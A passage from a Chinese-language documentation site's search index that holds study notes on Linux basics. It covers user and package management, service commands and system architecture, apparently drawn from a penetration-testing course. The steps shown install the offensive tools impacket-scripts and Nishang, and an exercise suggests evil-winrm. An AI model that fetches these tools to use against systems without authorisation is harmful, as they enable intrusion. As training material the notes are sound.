\u8bbe\u5907\u3002"},{"location":"%E7%B3%BB%E7%BB%9F/Linux%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86%E7%9A%84%E5%89%AF%E6%9C%AC/","title":"Linux\u7cfb\u7edf\u7ba1\u7406","text":""},{"location":"%E7%B3%BB%E7%BB%9F/Linux%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86%E7%9A%84%E5%89%AF%E6%9C%AC/#_1","title":"\u7528\u6237\u7ba1\u7406","text":"<p>\u7528\u6237\u7ba1\u7406\u662f Linux \u7ba1\u7406\u7684\u91cd\u8981\u7ec4\u6210\u90e8\u5206\u3002\u6709\u65f6\u6211\u4eec\u9700\u8981\u521b\u5efa\u65b0\u7528\u6237\u6216\u5c06\u5176\u4ed6\u7528\u6237\u6dfb\u52a0\u5230\u7279\u5b9a\u7ec4\u3002\u53e6\u4e00\u79cd\u53ef\u80fd\u6027\u662f\u4f5c\u4e3a\u4e0d\u540c\u7684\u7528\u6237\u6267\u884c\u547d\u4ee4\u3002\u6bd5\u7adf\uff0c\u53ea\u6709\u4e00\u4e2a\u7279\u5b9a\u7ec4\u7684\u7528\u6237\u6709\u6743\u67e5\u770b\u6216\u7f16\u8f91\u7279\u5b9a\u6587\u4ef6\u6216\u76ee\u5f55\u7684\u60c5\u51b5\u5e76\u4e0d\u5c11\u89c1\u3002\u53cd\u8fc7\u6765\uff0c\u8fd9\u4f7f\u6211\u4eec\u80fd\u591f\u5728\u673a\u5668\u4e0a\u672c\u5730\u6536\u96c6\u66f4\u591a\u4fe1\u606f\uff0c\u8fd9\u53ef\u80fd\u975e\u5e38\u91cd\u8981\u3002</p> \u547d\u4ee4 \u63cf\u8ff0 <code>sudo</code> \u4ee5\u4e0d\u540c\u7684\u7528\u6237\u8eab\u4efd\u6267\u884c\u547d\u4ee4\u3002 <code>su</code> \u8be5<code>su</code>\u5b9e\u7528\u7a0b\u5e8f\u901a\u8fc7 PAM \u8bf7\u6c42\u9002\u5f53\u7684\u7528\u6237\u51ed\u636e\u5e76\u5207\u6362\u5230\u8be5\u7528\u6237 ID\uff08\u9ed8\u8ba4\u7528\u6237\u662f\u8d85\u7ea7\u7528\u6237\uff09\u3002\u7136\u540e\u6267\u884c\u4e00\u4e2ashell\u3002 <code>useradd</code> \u521b\u5efa\u65b0\u7528\u6237\u6216\u66f4\u65b0\u9ed8\u8ba4\u7684\u65b0\u7528\u6237\u4fe1\u606f\u3002 <code>userdel</code> \u5220\u9664\u7528\u6237\u5e10\u6237\u548c\u76f8\u5173\u6587\u4ef6\u3002 <code>usermod</code> \u4fee\u6539\u7528\u6237\u5e10\u6237\u3002 <code>groupadd</code> \u5c06\u7ec4\u6dfb\u52a0\u5230\u7cfb\u7edf\u3002 <code>groupdel</code> \u4ece\u7cfb\u7edf\u4e2d\u5220\u9664\u4e00\u4e2a\u7ec4\u3002 <code>passwd</code> \u66f4\u6539\u7528\u6237\u5bc6\u7801\u3002"},{"location":"%E7%B3%BB%E7%BB%9F/Linux%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86%E7%9A%84%E5%89%AF%E6%9C%AC/#useradd","title":"useradd","text":"<pre><code>$ useradd [\u9009\u9879] [\u7528\u6237\u540d]\n</code></pre> <ul> <li>\u9009\u9879</li> <li><code>-b</code>    \u521b\u5efa\u7528\u6237\u7684\u540c\u65f6\u521b\u5efa\u5bb6\u76ee\u5f55</li> <li><code>-c</code>    \u6dfb\u52a0\u6ce8\u91ca</li> <li><code>-d</code>    \u6307\u5b9a\u7528\u6237\u5bb6\u76ee\u5f55\uff0c\u5982\u8def\u5f84\u4e0d\u5b58\u5728\u6dfb\u52a0 <code>-m</code> \u76f4\u63a5\u521b\u5efa</li> <li><code>-g</code>    \u6307\u5b9a\u7528\u6237\u6240\u5c5e\u7ec4</li> <li><code>-G</code>    \u6307\u5b9a\u7528\u6237\u9644\u52a0\u7ec4</li> <li><code>-s</code>    \u6307\u5b9a\u7528\u6237\u7684\u767b\u5f55 shell, \u6307\u5b9a shell \u6839\u8def\u5f84</li> <li><code>-u</code>    \u6307\u5b9a\u7528\u6237 uid \uff0c<code>-o</code> \u9009\u9879\u53ef\u4e0e\u5df2\u6709\u7528\u6237\u91cd\u590d</li> <li>\u7528\u6237\u540d</li> </ul>"},{"location":"%E7%B3%BB%E7%BB%9F/Linux%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86%E7%9A%84%E5%89%AF%E6%9C%AC/#userdel","title":"userdel","text":"<pre><code>$ userdel [\u9009\u9879] [\u7528\u6237\u540d]\n$ userdel -r    dark //\u8fde\u540c\u5bb6\u76ee\u5f55\u4e00\u540c\u5220\u9664\n</code></pre>"},{"location":"%E7%B3%BB%E7%BB%9F/Linux%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86%E7%9A%84%E5%89%AF%E6%9C%AC/#usermod","title":"usermod","text":"<pre><code>$ usermod [\u9009\u9879] [\u7528\u6237\u540d]    //\u9009\u9879\u4e0e useradd \u76f8\u540c\uff0c\u4e3a\u66f4\u6539\u64cd\u7eb5\n</code></pre>"},{"location":"%E7%B3%BB%E7%BB%9F/Linux%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86%E7%9A%84%E5%89%AF%E6%9C%AC/#passwd","title":"passwd","text":"<pre><code>$ passwd [\u9009\u9879] [\u7528\u6237\u540d]\n</code></pre> <ul> <li>\u9009\u9879</li> <li><code>-l</code>    \u9501\u5b9a\u53e3\u4ee4\uff0c\u7981\u7528\u8d26\u53f7</li> <li><code>-u</code>    \u89e3\u9501\u8d26\u53f7\u53e3\u4ee4</li> <li><code>-d</code>    \u5220\u9664\u8d26\u53f7\u53e3\u4ee4</li> <li>\u7528\u6237\u540d</li> </ul>"},{"location":"%E7%B3%BB%E7%BB%9F/Linux%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86%E7%9A%84%E5%89%AF%E6%9C%AC/#_2","title":"\u5305\u7ba1\u7406","text":"<p>\u65e0\u8bba\u662f\u4f5c\u4e3a\u7cfb\u7edf\u7ba1\u7406\u5458\u5de5\u4f5c\uff0c\u5728\u5bb6\u7ef4\u62a4\u6211\u4eec\u81ea\u5df1\u7684 Linux \u673a\u5668\uff0c\u8fd8\u662f\u6784\u5efa/\u5347\u7ea7/\u7ef4\u62a4\u6211\u4eec\u9009\u62e9\u7684\u6e17\u900f\u6d4b\u8bd5\u53d1\u884c\u7248\uff0c\u7262\u7262\u638c\u63e1\u53ef\u7528\u7684 Linux \u5305\u7ba1\u7406\u5668\u4ee5\u53ca\u5229\u7528\u5b83\u4eec\u7684\u5404\u79cd\u65b9\u6cd5\u6765\u5b89\u88c5\u3001\u66f4\u65b0\u6216\u5220\u9664\u8f6f\u4ef6\u5305\u3002\u8f6f\u4ef6\u5305\u662f\u5305\u542b\u8f6f\u4ef6\u4e8c\u8fdb\u5236\u6587\u4ef6\u3001\u914d\u7f6e\u6587\u4ef6\u3001\u4f9d\u8d56\u5173\u7cfb\u4fe1\u606f\u4ee5\u53ca\u8ddf\u8e2a\u66f4\u65b0\u548c\u5347\u7ea7\u7684\u6863\u6848\u3002\u5927\u591a\u6570\u5305\u7ba1\u7406\u7cfb\u7edf\u63d0\u4f9b\u7684\u529f\u80fd\u662f\uff1a</p> <ul> <li>\u5305\u4e0b\u8f7d</li> <li>\u4f9d\u8d56\u89e3\u6790</li> <li>\u6807\u51c6\u7684\u4e8c\u8fdb\u5236\u5305\u683c\u5f0f</li> <li>\u5e38\u89c1\u7684\u5b89\u88c5\u548c\u914d\u7f6e\u4f4d\u7f6e</li> <li>\u5176\u4ed6\u4e0e\u7cfb\u7edf\u76f8\u5173\u7684\u914d\u7f6e\u548c\u529f\u80fd</li> <li>\u8d28\u91cf\u63a7\u5236</li> </ul> <p>\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u8bb8\u591a\u4e0d\u540c\u7684\u5305\u7ba1\u7406\u7cfb\u7edf\uff0c\u6db5\u76d6\u4e0d\u540c\u7c7b\u578b\u7684\u6587\u4ef6\uff0c\u5982\u201c.deb\u201d\u3001\u201c.rpm\u201d\u7b49\u3002\u5305\u7ba1\u7406\u8981\u6c42\u662f\u8981\u5b89\u88c5\u7684\u8f6f\u4ef6\u53ef\u4ee5\u4f5c\u4e3a\u76f8\u5e94\u7684\u5305\u4f7f\u7528\u3002\u901a\u5e38\uff0c\u8fd9\u662f\u5728 Linux \u53d1\u884c\u7248\u4e0b\u96c6\u4e2d\u521b\u5efa\u3001\u63d0\u4f9b\u548c\u7ef4\u62a4\u7684\u3002\u8fd9\u6837\uff0c\u8f6f\u4ef6\u76f4\u63a5\u96c6\u6210\u5230\u7cfb\u7edf\u4e2d\uff0c\u5176\u5404\u4e2a\u76ee\u5f55\u5206\u5e03\u5728\u6574\u4e2a\u7cfb\u7edf\u4e2d\u3002\u5305\u7ba1\u7406\u8f6f\u4ef6\u5bf9\u7cfb\u7edf\u5b89\u88c5\u5305\u7684\u6539\u52a8\u53d6\u81ea\u5305\uff0c\u7531\u5305\u7ba1\u7406\u8f6f\u4ef6\u5b9e\u73b0\u3002\u5982\u679c\u5305\u7ba1\u7406\u8f6f\u4ef6\u8bc6\u522b\u51fa\u9700\u8981\u989d\u5916\u7684\u5305\u624d\u80fd\u4f7f\u5c1a\u672a\u5b89\u88c5\u7684\u5305\u6b63\u5e38\u8fd0\u884c\uff0c</p> <p>\u5982\u679c\u5df2\u5220\u9664\u5df2\u5b89\u88c5\u7684\u8f6f\u4ef6\uff0c\u5219\u5305\u7ba1\u7406\u7cfb\u7edf\u5c06\u91cd\u65b0\u83b7\u53d6\u5305\u7684\u4fe1\u606f\uff0c\u6839\u636e\u5176\u914d\u7f6e\u5bf9\u5176\u8fdb\u884c\u4fee\u6539\uff0c\u5e76\u5220\u9664\u6587\u4ef6\u3002\u6211\u4eec\u53ef\u4ee5\u4e3a\u6b64\u4f7f\u7528\u4e0d\u540c\u7684\u5305\u7ba1\u7406\u7a0b\u5e8f\u3002\u4ee5\u4e0b\u662f\u6b64\u7c7b\u7a0b\u5e8f\u7684\u793a\u4f8b\u5217\u8868\uff1a</p> \u547d\u4ee4 \u63cf\u8ff0 <code>dpkg</code> \u8fd9<code>dpkg</code>\u662f\u4e00\u4e2a\u5b89\u88c5\u3001\u6784\u5efa\u3001\u5220\u9664\u548c\u7ba1\u7406 Debian \u8f6f\u4ef6\u5305\u7684\u5de5\u5177\u3002\u4e3b\u8981\u548c\u66f4\u7528\u6237\u53cb\u597d\u7684\u524d\u7aef<code>dpkg</code>\u662f aptitude\u3002 <code>apt</code> Apt \u4e3a\u5305\u7ba1\u7406\u7cfb\u7edf\u63d0\u4f9b\u4e86\u4e00\u4e2a\u9ad8\u7ea7\u547d\u4ee4\u884c\u754c\u9762\u3002 <code>aptitude</code> aptitude \u662f apt \u7684\u66ff\u4ee3\u54c1\uff0c\u662f\u5305\u7ba1\u7406\u5668\u7684\u9ad8\u7ea7\u63a5\u53e3\u3002 <code>snap</code> \u5b89\u88c5\u3001\u914d\u7f6e\u3001\u5237\u65b0\u548c\u5220\u9664 snap \u5305\u3002Snap \u652f\u6301\u5b89\u5168\u5206\u53d1\u9002\u7528\u4e8e\u4e91\u3001\u670d\u52a1\u5668\u3001\u684c\u9762\u548c\u7269\u8054\u7f51\u7684\u6700\u65b0\u5e94\u7528\u7a0b\u5e8f\u548c\u5b9e\u7528\u7a0b\u5e8f\u3002 <code>gem</code> Gem \u662f RubyGems \u7684\u524d\u7aef\uff0cRuby \u7684\u6807\u51c6\u5305\u7ba1\u7406\u5668\u3002 <code>pip</code> Pip \u662f\u4e00\u4e2a Python \u5305\u5b89\u88c5\u7a0b\u5e8f\uff0c\u63a8\u8350\u7528\u4e8e\u5b89\u88c5 Debian \u5b58\u6863\u4e2d\u4e0d\u53ef\u7528\u7684 Python \u5305\u3002\u5b83\u53ef\u4ee5\u4e0e\u7248\u672c\u63a7\u5236\u5b58\u50a8\u5e93\uff08\u76ee\u524d\u53ea\u6709 Git\u3001Mercurial \u548c Bazaar \u5b58\u50a8\u5e93\uff09\u4e00\u8d77\u4f7f\u7528\uff0c\u5e7f\u6cdb\u8bb0\u5f55\u8f93\u51fa\uff0c\u5e76\u901a\u8fc7\u5728\u5f00\u59cb\u5b89\u88c5\u4e4b\u524d\u4e0b\u8f7d\u6240\u6709\u8981\u6c42\u6765\u9632\u6b62\u90e8\u5206\u5b89\u88c5\u3002 <code>git</code> Git \u662f\u4e00\u4e2a\u5feb\u901f\u3001\u53ef\u6269\u5c55\u3001\u5206\u5e03\u5f0f\u7684\u4fee\u8ba2\u63a7\u5236\u7cfb\u7edf\uff0c\u5177\u6709\u5f02\u5e38\u4e30\u5bcc\u7684\u547d\u4ee4\u96c6\uff0c\u53ef\u63d0\u4f9b\u9ad8\u7ea7\u64cd\u4f5c\u548c\u5bf9\u5185\u90e8\u7684\u5b8c\u5168\u8bbf\u95ee\u3002 <p>\u5f3a\u70c8\u5efa\u8bae\u5728\u672c\u5730\u8bbe\u7f6e\u6211\u4eec\u7684\u865a\u62df\u673a (VM) \u4ee5\u8fdb\u884c\u8bd5\u9a8c\u3002\u8ba9\u6211\u4eec\u5728\u672c\u5730 VM \u4e2d\u8fdb\u884c\u4e00\u4e9b\u8bd5\u9a8c\uff0c\u5e76\u4f7f\u7528\u4e00\u4e9b\u989d\u5916\u7684\u5305\u5bf9\u5176\u8fdb\u884c\u6269\u5c55\u3002\u9996\u5148\uff0c\u8ba9\u6211\u4eec<code>git</code>\u4f7f\u7528<code>apt</code>.</p>"},{"location":"%E7%B3%BB%E7%BB%9F/Linux%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86%E7%9A%84%E5%89%AF%E6%9C%AC/#apt","title":"\u9ad8\u7ea7\u5305\u7ba1\u7406\u5668 (APT)","text":"<p>\u57fa\u4e8e Debian \u7684 Linux \u53d1\u884c\u7248\u4f7f\u7528<code>APT</code>\u5305\u7ba1\u7406\u5668\u3002\u5305\u662f\u5305\u542b\u591a\u4e2a\u201c.deb\u201d\u6587\u4ef6\u7684\u5b58\u6863\u6587\u4ef6\u3002\u8be5<code>dpkg</code>\u5b9e\u7528\u7a0b\u5e8f\u7528\u4e8e\u4ece\u5173\u8054\u7684\u201c.deb\u201d\u6587\u4ef6\u5b89\u88c5\u7a0b\u5e8f\u3002<code>APT</code>\u4f7f\u66f4\u65b0\u548c\u5b89\u88c5\u7a0b\u5e8f\u66f4\u5bb9\u6613\uff0c\u56e0\u4e3a\u8bb8\u591a\u7a0b\u5e8f\u90fd\u6709\u4f9d\u8d56\u5173\u7cfb\u3002\u4ece\u72ec\u7acb\u7684\u201c.deb\u201d\u6587\u4ef6\u5b89\u88c5\u7a0b\u5e8f\u65f6\uff0c\u6211\u4eec\u53ef\u80fd\u4f1a\u9047\u5230\u4f9d\u8d56\u95ee\u9898\uff0c\u9700\u8981\u4e0b\u8f7d\u5e76\u5b89\u88c5\u4e00\u4e2a\u6216\u591a\u4e2a\u9644\u52a0\u5305\u3002<code>APT</code>\u901a\u8fc7\u5c06\u5b89\u88c5\u7a0b\u5e8f\u6240\u9700\u7684\u6240\u6709\u4f9d\u8d56\u9879\u6253\u5305\u5728\u4e00\u8d77\uff0c\u4f7f\u8fd9\u66f4\u5bb9\u6613\u548c\u66f4\u6709\u6548\u3002</p> <p>\u6bcf\u4e2a Linux \u53d1\u884c\u7248\u90fd\u4f7f\u7528\u7ecf\u5e38\u66f4\u65b0\u7684\u8f6f\u4ef6\u5b58\u50a8\u5e93\u3002\u5f53\u6211\u4eec\u66f4\u65b0\u7a0b\u5e8f\u6216\u5b89\u88c5\u65b0\u7a0b\u5e8f\u65f6\uff0c\u7cfb\u7edf\u4f1a\u5728\u8fd9\u4e9b\u5b58\u50a8\u5e93\u4e2d\u67e5\u8be2\u6240\u9700\u7684\u5305\u3002\u5b58\u50a8\u5e93\u53ef\u4ee5\u6807\u8bb0\u4e3a\u7a33\u5b9a\u3001\u6d4b\u8bd5\u6216\u4e0d\u7a33\u5b9a\u3002\u5927\u591a\u6570 Linux \u53d1\u884c\u7248\u4f7f\u7528\u6700\u7a33\u5b9a\u6216\u201c\u4e3b\u8981\u201d\u7684\u5b58\u50a8\u5e93\u3002\u8fd9\u53ef\u4ee5\u901a\u8fc7\u67e5\u770b<code>/etc/apt/sources.list</code>\u6587\u4ef6\u7684\u5185\u5bb9\u6765\u68c0\u67e5\u3002Parrot OS \u7684\u5b58\u50a8\u5e93\u5217\u8868\u4f4d\u4e8e<code>/etc/apt/sources.list.d/parrot.list</code>.</p> <pre><code>darkinga@htb[/htb]$ cat /etc/apt/sources.list.d/parrot.list\n\n# parrot repository\n# this file was automatically generated by parrot-mirror-selector\ndeb http://htb.deb.parrot.sh/parrot/ rolling main contrib non-free\n#deb-src https://deb.parrot.sh/parrot/ rolling main contrib non-free\ndeb http://htb.deb.parrot.sh/parrot/ rolling-security main contrib non-free\n#deb-src https://deb.parrot.sh/parrot/ rolling-security main contrib non-free\n</code></pre> <p>APT \u4f7f\u7528\u79f0\u4e3a APT \u7f13\u5b58\u7684\u6570\u636e\u5e93\u3002\u8fd9\u7528\u4e8e\u63d0\u4f9b\u6709\u5173\u79bb\u7ebf\u5b89\u88c5\u5728\u6211\u4eec\u7cfb\u7edf\u4e0a\u7684\u8f6f\u4ef6\u5305\u7684\u4fe1\u606f\u3002\u4f8b\u5982\uff0c\u6211\u4eec\u53ef\u4ee5\u641c\u7d22 APT \u7f13\u5b58\u6765\u67e5\u627e\u6240\u6709<code>Impacket</code>\u76f8\u5173\u7684\u5305\u3002</p> <pre><code>darkinga@htb[/htb]$ apt-cache search impacket\n\nimpacket-scripts - Links to useful impacket scripts examples\npolenum - Extracts the password policy from a Windows system\npython-pcapy - Python interface to the libpcap packet capture library (Python 2)\npython3-impacket - Python3 module to easily build and dissect network protocols\npython3-pcapy - Python interface to the libpcap packet capture library (Python 3)\n</code></pre> <p>\u7136\u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u67e5\u770b\u6709\u5173\u5305\u7684\u5176\u4ed6\u4fe1\u606f\u3002</p> <pre><code>darkinga@htb[/htb]$ apt-cache show impacket-scripts\n\nPackage: impacket-scripts\nVersion: 1.4\nArchitecture: all\nMaintainer: Kali Developers &lt;devel@kali.org&gt;\nInstalled-Size: 13\nDepends: python3-impacket (&gt;= 0.9.20), python3-ldap3 (&gt;= 2.5.0), python3-ldapdomaindump\nBreaks: python-impacket (&lt;&lt; 0.9.18)\nReplaces: python-impacket (&lt;&lt; 0.9.18)\nPriority: optional\nSection: misc\nFilename: pool/main/i/impacket-scripts/impacket-scripts_1.4_all.deb\nSize: 2080\n&lt;SNIP&gt;\n</code></pre> <p>\u6211\u4eec\u8fd8\u53ef\u4ee5\u5217\u51fa\u6240\u6709\u5df2\u5b89\u88c5\u7684\u8f6f\u4ef6\u5305\u3002</p> <pre><code>darkinga@htb[/htb]$ apt list --installed\n\nListing... Done\naccountsservice/rolling,now 0.6.55-2 amd64 [installed,automatic]\n&lt;SNIP&gt;\n</code></pre> <p>\u5982\u679c\u6211\u4eec\u7f3a\u5c11\u4e00\u4e9b\u5305\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u4ee5\u4e0b\u547d\u4ee4\u641c\u7d22\u5e76\u5b89\u88c5\u5b83\u3002</p> <p>\u9ad8\u7ea7\u5305\u7ba1\u7406\u5668 (APT)</p> <pre><code>darkinga@htb[/htb]$ sudo apt install impacket-scripts -y\n\nReading package lists... Done\nBuilding dependency tree       \nReading state information... Done\nThe following NEW packages will be installed:\n  impacket-scripts\n0 upgraded, 1 newly installed, 0 to remove and 0 not upgraded.\nNeed to get 2,080 B of archives.\nAfter this operation, 13.3 kB of additional disk space will be used.\nGet:1 https://euro2-emea-mirror.parrot.sh/mirrors/parrot rolling/main amd64 impacket-scripts all 1.4 [2,080 B]\nFetched 2,080 B in 0s (15.2 kB/s)\nSelecting previously unselected package impacket-scripts.\n(Reading database ... 378459 files and directories currently installed.)\nPreparing to unpack .../impacket-scripts_1.4_all.deb ...\nUnpacking impacket-scripts (1.4) ...\nSetting up impacket-scripts (1.4) ...\nScanning application launchers\nRemoving duplicate launchers from Debian\nLaunchers are updated\n</code></pre>"},{"location":"%E7%B3%BB%E7%BB%9F/Linux%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86%E7%9A%84%E5%89%AF%E6%9C%AC/#git","title":"Git","text":"<p>\u73b0\u5728\u6211\u4eec\u5df2\u7ecf<code>git</code>\u5b89\u88c5\u597d\u4e86\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u5b83\u4ece Github \u4e0b\u8f7d\u6709\u7528\u7684\u5de5\u5177\u3002\u4e00\u4e2a\u8fd9\u6837\u7684\u9879\u76ee\u88ab\u79f0\u4e3a\u201cNishang\u201d\u3002\u7a0d\u540e\u6211\u4eec\u5c06\u5904\u7406\u548c\u5904\u7406\u9879\u76ee\u672c\u8eab\u3002\u9996\u5148\uff0c\u6211\u4eec\u9700\u8981\u5bfc\u822a\u5230\u9879\u76ee\u7684\u5b58\u50a8\u5e93\u5e76\u590d\u5236 Github \u94fe\u63a5\uff0c\u7136\u540e\u518d\u4f7f\u7528 git \u4e0b\u8f7d\u5b83\u3002</p> <p></p> <p>\u5c3d\u7ba1\u5982\u6b64\uff0c\u5728\u6211\u4eec\u4e0b\u8f7d\u9879\u76ee\u53ca\u5176\u811a\u672c\u548c\u5217\u8868\u4e4b\u524d\uff0c\u6211\u4eec\u5e94\u8be5\u521b\u5efa\u4e00\u4e2a\u7279\u5b9a\u7684\u6587\u4ef6\u5939\u3002</p> <p><code>mkdir ~/nishang/ &amp;&amp; git clone https://github.com/samratashok/nishang.git ~/nishang</code></p>"},{"location":"%E7%B3%BB%E7%BB%9F/Linux%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86%E7%9A%84%E5%89%AF%E6%9C%AC/#dpkg","title":"DPKG","text":"<p>\u6211\u4eec\u8fd8\u53ef\u4ee5\u5206\u522b\u4ece\u5b58\u50a8\u5e93\u4e2d\u4e0b\u8f7d\u7a0b\u5e8f\u548c\u5de5\u5177\u3002\u5728\u6b64\u793a\u4f8b\u4e2d\uff0c\u6211\u4eec\u4e3a Ubuntu 18.04 LTS \u4e0b\u8f7d\u201cstrace\u201d\u3002</p> <p><code>wget http://archive.ubuntu.com/ubuntu/pool/main/s/strace/strace_4.21-1ubuntu1_amd64.deb</code></p> <p>\u6b64\u5916\uff0c\u73b0\u5728\u6211\u4eec\u53ef\u4ee5\u540c\u65f6\u4f7f\u7528<code>apt</code>\u548c<code>dpkg</code>\u6765\u5b89\u88c5\u8f6f\u4ef6\u5305\u3002\u7531\u4e8e\u6211\u4eec\u5df2\u7ecf\u4f7f\u7528\u8fc7<code>apt</code>\uff0c\u6211\u4eec\u5c06<code>dpkg</code>\u5728\u4e0b\u4e00\u4e2a\u793a\u4f8b\u4e2d\u8fdb\u884c\u4ecb\u7ecd\u3002</p> <p><code>sudo dpkg -i strace_4.21-1ubuntu1_amd64.deb</code></p>"},{"location":"%E7%B3%BB%E7%BB%9F/Linux%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86%E7%9A%84%E5%89%AF%E6%9C%AC/#_3","title":"\u53ef\u9009\u7ec3\u4e60\uff1a","text":"<p>\u5728 Github \u4e0a\u641c\u7d22\u201c evil-winrm \u201d\u5de5\u5177\u5e76\u5c06\u5176\u5b89\u88c5\u5728\u6211\u4eec\u7684\u4ea4\u4e92\u5f0f\u5b9e\u4f8b\u4e0a\u3002\u5c1d\u8bd5\u6240\u6709\u4e0d\u540c\u7684\u5b89\u88c5\u65b9\u6cd5\u3002</p>"},{"location":"%E7%B3%BB%E7%BB%9F/Linux%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86%E7%9A%84%E5%89%AF%E6%9C%AC/#_4","title":"\u670d\u52a1\u548c\u8fdb\u7a0b\u7ba1\u7406","text":"<p>systemctl start/restart/stop/enable/disable</p> <p>\u6dfb\u52a0\u5b88\u62a4\u7a0b\u5e8f\u914d\u7f6e\u6587\u4ef6</p> <p>service </p> <p>\u8fdb\u7a0b\u7ba1\u7406</p> <p>kill 9 \u6740\u6389pid\u6240\u5728\u8fdb\u7a0b</p>"},{"location":"%E7%B3%BB%E7%BB%9F/linux%E5%9F%BA%E7%A1%80-%E7%BB%93%E6%9E%84/","title":"linux\u7ed3\u6784","text":""},{"location":"%E7%B3%BB%E7%BB%9F/linux%E5%9F%BA%E7%A1%80-%E7%BB%93%E6%9E%84/#_1","title":"\u54f2\u5b66","text":""},{"location":"%E7%B3%BB%E7%BB%9F/linux%E5%9F%BA%E7%A1%80-%E7%BB%93%E6%9E%84/#everything-is-a-file","title":"Everything is a file.","text":"<p>Linux \u64cd\u4f5c\u7cfb\u7edf\u4e0a\u8fd0\u884c\u7684\u5404\u79cd\u670d\u52a1\u7684\u6240\u6709\u914d\u7f6e\u6587\u4ef6\u90fd\u5b58\u50a8\u5728\u4e00\u4e2a\u6216\u591a\u4e2a\u6587\u672c\u6587\u4ef6\u4e2d\u3002</p>"},{"location":"%E7%B3%BB%E7%BB%9F/linux%E5%9F%BA%E7%A1%80-%E7%BB%93%E6%9E%84/#ability-to-chain-programs-together-to-perform-complex-tasks","title":"Ability to chain programs together to perform complex tasks","text":"<p>\u4e0d\u540c\u5de5\u5177\u7684\u7ec4\u5408\u53ef\u4ee5\u4f7f\u6211\u4eec\u5b8c\u6210\u8bb8\u591a\u5927\u578b\u800c\u590d\u6742\u7684\u4efb\u52a1\uff0c\u4f8b\u5982\u5904\u7406\u6216\u8fc7\u6ee4\u7279\u5b9a\u7684\u6570\u636e\u7ed3\u679c\u3002</p>"},{"location":"%E7%B3%BB%E7%BB%9F/linux%E5%9F%BA%E7%A1%80-%E7%BB%93%E6%9E%84/#avoid-captive-user-interfaces","title":"Avoid captive user interfaces","text":"<p>Linux \u65e8\u5728\u4e3b\u8981\u4e0e shell \u6216\u4e00\u8d77\u5de5\u4f5c\uff0c\u8fd9\u4f7f\u7528\u6237\u53ef\u4ee5\u66f4\u597d\u5730\u63a7\u5236\u64cd\u4f5c\u7cfb\u7edf\u3002</p>"},{"location":"%E7%B3%BB%E7%BB%9F/linux%E5%9F%BA%E7%A1%80-%E7%BB%93%E6%9E%84/#_2","title":"\u7ec4\u6210","text":"\u7ec4\u4ef6 \u63cf\u8ff0 Bootloader \u4e00\u6bb5\u4ee3\u7801\uff0c\u7528\u4e8e\u6307\u5bfc\u5f15\u5bfc\u8fc7\u7a0b\u4ee5\u542f\u52a8\u64cd\u4f5c\u7cfb\u7edf\u3002Parrot Linux \u4f7f\u7528 GRUB \u5f15\u5bfc\u52a0\u8f7d\u7a0b\u5e8f\u3002 OS Kernel Linux\u5185\u6838 Daemons \u5b88\u62a4\u7a0b\u5e8f\uff0cLinux\u4e2d\u7684\u5b88\u62a4\u7a0b\u5e8f OS Shell \u64cd\u4f5c\u7cfb\u7edf\u548c\u7528\u6237\u4e4b\u95f4\u7684\u63a5\u53e3 Graphics server \u8fd9\u63d0\u4f9b\u4e86\u4e00\u4e2a\u79f0\u4e3a\u201cX\u201d\u6216\u201cX-server\u201d\u7684\u56fe\u5f62\u5b50\u7cfb\u7edf\uff08\u670d\u52a1\u5668\uff09\uff0c\u5b83\u5141\u8bb8\u56fe\u5f62\u7a0b\u5e8f\u5728 X-windowing \u7cfb\u7edf\u4e0a\u672c\u5730\u6216\u8fdc\u7a0b\u8fd0\u884c\u3002 Winow manager \u56fe\u5f62\u7528\u6237\u754c\u9762 Utilities \u5e94\u7528\u7a0b\u5e8f\u6216\u5b9e\u7528\u7a0b\u5e8f\u662f\u4e3a\u7528\u6237\u6216\u5176\u4ed6\u7a0b\u5e8f\u6267\u884c\u7279\u5b9a\u529f\u80fd\u7684\u7a0b\u5e8f\u3002"},{"location":"%E7%B3%BB%E7%BB%9F/linux%E5%9F%BA%E7%A1%80-%E7%BB%93%E6%9E%84/#linux_1","title":"Linux\u67b6\u6784","text":"\u5c42 \u63cf\u8ff0 Hardware \u5916\u56f4\u8bbe\u5907\uff0c\u4f8b\u5982\u7cfb\u7edf\u7684 RAM\u3001\u786c\u76d8\u9a71\u52a8\u5668\u3001CPU \u7b49\u3002 Kernel Linux \u64cd\u4f5c\u7cfb\u7edf\u7684\u6838\u5fc3\uff0c\u5176\u529f\u80fd\u662f\u865a\u62df\u5316\u548c\u63a7\u5236\u5e38\u89c1\u7684\u8ba1\u7b97\u673a\u786c\u4ef6\u8d44\u6e90\uff0c\u5982 CPU\u3001\u5206\u914d\u7684\u5185\u5b58\u3001\u8bbf\u95ee\u7684\u6570\u636e\u7b49\u3002\u5185\u6838\u4e3a\u6bcf\u4e2a\u8fdb\u7a0b\u63d0\u4f9b\u81ea\u5df1\u7684\u865a\u62df\u8d44\u6e90\uff0c\u5e76\u9632\u6b62\u6216\u51cf\u8f7b\u4e0d\u540c\u8fdb\u7a0b\u4e4b\u95f4\u7684\u51b2\u7a81\u3002 Shell \u547d\u4ee4\u884c\u754c\u9762 ( CLI )\uff0c\u4e5f\u79f0\u4e3a shell\uff0c\u7528\u6237\u53ef\u4ee5\u5728\u5176\u4e2d\u8f93\u5165\u547d\u4ee4\u4ee5\u6267\u884c\u5185\u6838\u7684\u529f\u80fd\u3002 System Utility 